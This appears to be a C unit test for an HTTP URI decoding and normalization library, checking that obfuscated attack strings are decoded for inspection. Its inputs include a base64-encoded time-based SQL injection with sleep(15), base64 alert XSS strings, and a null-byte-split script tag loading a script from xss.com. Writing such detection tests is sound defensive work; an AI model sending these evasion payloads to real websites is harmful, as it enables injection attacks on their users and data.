#include "decoding.h"
#include "normalization.h"

#include <string.h>

#include "../common/unit_test.h"

static int run_uri_pipeline(char *dst, size_t dst_sz, const char *src) {
    char tmp_a[4096];
    char tmp_b[4096];
    int  rc;

    if (NULL == dst || NULL == src || 0U == dst_sz) {
        return -1;
    }

    rc = http_uri_canonicalize(tmp_a, sizeof(tmp_a), src, 3);
    if (rc < 0) {
        return -1;
    }

    rc = http_decode_plus_as_space(tmp_b, sizeof(tmp_b), tmp_a);
    if (rc < 0) {
        return -1;
    }

    rc = http_normalize_uri(dst, dst_sz, tmp_b);
    if (rc < 0) {
        return -1;
    }

    return 0;
}

int main(void) {
    char    text[4096];
    const char *uri_input;
    int rc;

    uri_input =
        "/KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw";

    rc = http_uri_canonicalize(text, sizeof(text), uri_input, 3);
    EXPECT_INT_EQ("http_uri_canonicalize.uri_sleep_base64", 1, rc);
    EXPECT_TRUE("http_uri_canonicalize.uri_sleep_base64",
                "decoded sleep payload present",
                NULL != strstr(text, "select(sleep(15))"));

    uri_input = "/KGFsZXJ0KSgxKQ";
    rc = http_uri_canonicalize(text, sizeof(text), uri_input, 3);
    EXPECT_INT_EQ("http_uri_canonicalize.uri_alert_base64", 1, rc);
    EXPECT_TRUE("http_uri_canonicalize.uri_alert_base64",
                "decoded alert payload present",
                NULL != strstr(text, "(alert)(1)"));

    uri_input = "/?e4411414ce=KGFsZXJ0KSgxKQ";
    rc = http_uri_canonicalize(text, sizeof(text), uri_input, 3);
    EXPECT_INT_EQ("http_uri_canonicalize.uri_query_alert_base64", 1, rc);
    EXPECT_TRUE("http_uri_canonicalize.uri_query_alert_base64",
                "decoded alert query payload present",
                NULL != strstr(text, "(alert)(1)"));

    uri_input = "/%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript";
    rc = http_uri_canonicalize(text, sizeof(text), uri_input, 3);
    EXPECT_INT_EQ("http_uri_canonicalize.uri_null_split_script", 1, rc);
    EXPECT_TRUE("http_uri_canonicalize.uri_null_split_script",
                "decoded script payload present",
                NULL != strstr(text, "<<script/src=http://xss.com/xss.js></script"));

    uri_input = "/%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript";
    rc = run_uri_pipeline(text, sizeof(text), uri_input);
    EXPECT_INT_EQ("run_uri_pipeline.uri_null_split_script_path", 0, rc);
    EXPECT_TRUE("run_uri_pipeline.uri_null_split_script_path",
                "normalized path keeps full script payload",
                NULL != strstr(text, "<<script/src=http://xss.com/xss.js></script"));

    uri_input = "/?fa3541d6f2=%3C%3Cscr%00ipt%2Fsrc=http:%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript";
    rc = run_uri_pipeline(text, sizeof(text), uri_input);
    EXPECT_INT_EQ("run_uri_pipeline.uri_null_split_script_query", 0, rc);
    EXPECT_TRUE("run_uri_pipeline.uri_null_split_script_query",
                "normalized query keeps full script payload",
                NULL != strstr(text, "<<script/src=http://xss.com/xss.js></script"));

    return 0;
}
